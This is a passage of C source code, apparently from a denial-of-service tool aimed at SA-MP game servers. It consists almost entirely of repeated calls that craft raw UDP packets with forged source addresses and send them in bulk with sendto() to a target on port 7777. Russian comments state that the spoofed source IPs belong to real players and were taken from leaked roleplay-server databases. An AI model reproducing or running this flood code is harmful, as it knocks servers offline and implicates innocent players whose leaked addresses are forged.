		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_type18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_ms17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_arz1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)& list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv18(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv19(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv20(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv21(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv22(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv23(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv24(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv25(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv26(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv27(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv28(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv29(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv30(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv31(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv32(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv33(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv34(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv35(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv36(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt8(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt9(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt10(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt11(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt12(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt13(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt14(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt15(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt16(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_tt17(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));
		if (TypeGenIP == 0)
		{
			list_node_abuse = list_node_abuse->anext; //ага да, перебор ип адресов провайдеров реальных самп игроков, беру со слитых баз данных рп серверов
		}
		//////////////////////////////////////////////////////////////////////////////////////////////////
		////////////////////////////////////////////////////////////////////////////////////////////////// 
		PKT->ip_header(iph); //https://youtu.be/zpzdgmqIHOQ
		udph->source = htons(7777); //порт клиента
		if (TypeGenIP == 0)
		{
			iph->saddr = list_node_abuse->adata.sin_addr.s_addr; //абуз ипы атакующие
		}
		////////////////////////////////////////////////////////////////////////////////////////////////// самп квери
		PKT->samp_vv37(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_vv38(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa1(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa2(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa3(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa4(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa5(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa6(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

		PKT->samp_aa7(iph, udph);
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr*)&list_node->datalist, sizeof(list_node->datalist));

